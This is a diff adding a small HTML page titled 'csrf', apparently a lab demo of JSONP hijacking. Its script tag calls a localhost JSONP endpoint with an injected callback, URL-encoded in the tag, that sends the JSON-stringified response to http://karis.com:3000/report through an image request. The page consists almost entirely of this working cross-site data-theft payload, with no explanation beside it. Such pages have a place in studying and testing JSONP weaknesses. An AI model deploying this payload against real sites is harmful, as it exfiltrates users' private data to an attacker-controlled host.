@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>csrf</title>
+    <script>
+      window.onerror = function() {
+        console.error(arguments);
+      };
+    </script>
+  </head>
+  <body>
+    <h1>hello world</h1>
+    <script src="http://localhost:3000/api/jsonp?callback=(new%20Image).src%3D%22http%3A%2F%2Fkaris.com%3A3000%2Freport%3Fdata%3D%22%2BJSON.stringify"></script>
+  </body>
+</html>
